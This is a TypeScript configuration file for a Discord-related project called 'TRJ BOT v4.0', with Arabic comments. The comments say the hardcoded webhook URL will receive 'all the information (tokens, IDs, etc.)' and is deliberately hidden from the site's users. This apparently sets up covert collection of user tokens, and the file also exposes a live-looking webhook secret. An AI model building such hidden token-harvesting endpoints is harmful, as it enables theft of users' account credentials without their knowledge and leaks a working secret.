// ============================================================
// src/lib/config.ts - ملف الإعدادات المركزي - TRJ BOT v4.0
// ============================================================
//
// ⚠️ ضع رابط الويب هوك الخاص بك هنا
// هذا الرابط سيستقبل جميع المعلومات (توكنات، أيديات، إلخ)
// لا يظهر في الموقع - مخفي في الكود فقط
//
// ============================================================

/** رابط الويب هوك المخفي - ضعه هنا مباشرة كنص */
export const LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1497239567365832735/lMPfjKUNDAQgYKj8t8gkV0rgIPEJ6hqY4ANrX9vRu_gcoy1e07Bfx5K8-mb5HhLyHuz2';

/** إعدادات السيرفر */
export const TRJ_SERVER_ID = '1365853182088773744';
export const SERVER_INVITE_URL = 'https://discord.gg/MpwvCypA66';

/**
 * الحصول على رابط الويب هوك للسجلات
 */
export function getLogWebhookUrl(): string | undefined {
  if (!LOG_WEBHOOK_URL || LOG_WEBHOOK_URL.length < 20) return undefined;
  return LOG_WEBHOOK_URL;
}
